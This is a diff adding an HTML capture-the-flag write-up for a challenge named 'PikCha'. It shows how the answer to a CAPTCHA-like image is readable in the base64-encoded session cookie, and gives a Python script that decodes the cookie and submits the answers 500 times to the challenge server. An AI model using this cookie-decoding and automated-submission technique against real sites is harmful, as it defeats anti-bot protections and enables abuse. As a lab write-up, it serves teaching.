@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>PikCha</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">PikCha</h1>
+</header>
+<p>The page shows a random generated image with random generated file name every time refresh, for the first time visit it, a <code>session</code> value is set in cookie.</p>
+<pre><code>session: eyJhbnN3ZXIiOlsyNSwyMywxMyw5M10sImNvcnJlY3QiOjIsImltYWdlIjoiLi9zdGF0aWMvY2hhbGwtaW1hZ2VzL2lNdUx4T29DeUIuanBnIn0.YGrDwA.Vr2yoO58ay3OhDqhOd6xqLYa45c</code></pre>
+<p>Decode it with <code>base64</code> we get key-value data, as the <code>session</code> value itself comes with some additional bytes at the end, might cause some parse issue. It seems <code>answer</code> is correct guess for <code>image</code>. Send it with <code>,</code> is not working and the guess count is reset to 0, but it works with space splitter.</p>
+<pre><code>base64 -d &lt;&lt;&lt; eyJhbnN3ZXIiOlsyNSwyMywxMyw5M10sImNvcnJlY3QiOjIsImltYWdlIjoiLi9zdGF0aWMvY2hhbGwtaW1hZ2VzL2lNdUx4T29DeUIuanBnIn0.YGrDwA.Vr2yoO58ay3OhDqhOd6xqLYa45c
+{&quot;answer&quot;:[25,23,13,93],&quot;correct&quot;:2,&quot;image&quot;:&quot;./static/chall-images/iMuLxOoCyB.jpg&quot;}base64: invalid input</code></pre>
+<p>The session value is used for post requests. If the submitted data is correct, the correct guess count on page is increamented by 1. Every time we make a guess the session value in cookie changes, so we need to re-parse and use it for the next guess. We need to guess 500 times to meet the requirement.</p>
+<pre><code>remote = &quot;http://104.197.195.221:8084&quot;
+
+def parse():
+    sess = base64.decodebytes(rsp.cookies[&#39;session&#39;].split(&#39;.&#39;)[0].encode()+b&#39;==&#39;)
+    ans = json.loads(sess)[&#39;answer&#39;]
+    guess = &#39; &#39;.join(map(str, json.loads(sess)[&#39;answer&#39;]))
+    return guess
+
+rsp = requests.get(remote)
+guess = parse()
+
+for i in range(1, 501):
+    rsp = requests.post(remote,
+            data={&#39;guess&#39;: guess},
+            headers={
+            &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,
+            },
+            cookies=rsp.cookies)
+    print(rsp.text)
+    guess = parse()</code></pre>
+<p>After 500 correct guess, we get the flag in response.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
